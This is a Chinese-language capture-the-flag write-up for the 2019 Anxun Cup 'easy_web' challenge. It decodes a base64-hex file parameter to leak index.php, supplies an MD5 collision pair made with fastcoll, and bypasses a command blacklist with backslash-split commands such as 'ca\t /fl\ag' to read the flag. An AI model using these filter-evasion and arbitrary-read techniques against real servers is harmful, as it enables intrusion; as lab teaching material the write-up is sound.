# \[安洵杯 2019]easy\_web

## \[安洵杯 2019]easy\_web

## 考点

* fastcoll进行md5碰撞
* 命令执行bypass

## wp

进去发现URL有问题`index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=`

尝试对其base64解码，发现解不出，加个`=`再试试，两次base64，一次hex

```
TXpVek5UTTFNa1UzTURaRk5qYz0=
MzUzNTM1MkU3MDZFNjc=
3535352E706E67
555.png
```

读取index.php，`index.php?img=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3`

得到代码

```php
<?php
error_reporting(E_ALL || ~ E_NOTICE);
header('content-type:text/html;charset=utf-8');
$cmd = $_GET['cmd'];
if (!isset($_GET['img']) || !isset($_GET['cmd'])) 
    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');
$file = hex2bin(base64_decode(base64_decode($_GET['img'])));

$file = preg_replace("/[^a-zA-Z0-9.]+/", "", $file);
if (preg_match("/flag/i", $file)) {
    echo '<img src ="./ctf3.jpeg">';
    die("xixi～ no flag");
} else {
    $txt = base64_encode(file_get_contents($file));
    echo "<img src='data:image/gif;base64," . $txt . "'></img>";
    echo "<br>";
}
echo $cmd;
echo "<br>";
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|<|>/i", $cmd)) {
    echo("forbid ~");
    echo "<br>";
} else {
    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {
        echo `$cmd`;
    } else {
        echo ("md5 is funny ~");
    }
}
?>
```

MD5是强制转换为string再比较，只能使用fastcoll进行碰撞

![](<../../.gitbook/assets/image (20) (1).png>)

`fastcoll_v1.0.0.5.exe -p a.txt -o 1.txt 2.txt`

```
a=dada%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%81z%CE%10%97%DD%29%E5%E7%82%C4%F0%05n%BE%87ykQ%A9p%D2%9D%B83jC%BA%CA%A1F%FA%17%1D%10%C0N%87%2BPG%22%E1C%8F5%3E%87%14%81%80%1D%AB0%ACF%C7%0E%BD%A6%E8%C4%269%C9y%18%D9j%84%07%93w2%26%0D%C9%E89O2%1C%DA2%0D%26F%25%D1Zv%3D%ECG%DE%E5f%A5%C6%1A%F4%D2%FF%CC%CAsx%B7%B6de%26n%0B%EF%1D%83m%EB%08%B8%9F%AB%3FVZ%9A%E8&b=dada%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%81z%CE%10%97%DD%29%E5%E7%82%C4%F0%05n%BE%87ykQ%29p%D2%9D%B83jC%BA%CA%A1F%FA%17%1D%10%C0N%87%2BPG%22%E1C%8F%B5%3E%87%14%81%80%1D%AB0%ACF%C7%0E%BD%26%E8%C4%269%C9y%18%D9j%84%07%93w2%26%0D%C9%E89O2%1C%DA%B2%0D%26F%25%D1Zv%3D%ECG%DE%E5f%A5%C6%1A%F4%D2%FF%CC%CAsx%B7%B6%E4d%26n%0B%EF%1D%83m%EB%08%B8%9F%AB%BFVZ%9A%E8
```

然后绕命令执行，虽然禁用了ls，但是dir还可以使用

![](<../../.gitbook/assets/image (10) (1) (1) (1).png>)

空格不能直接敲，要用用%20代替，

过滤了`flag`和`cat`，用`\`绕过，`?cmd=ca\t%20/fl\ag` 查看flag

或者是`?cmd=sort%20/fl\ag`
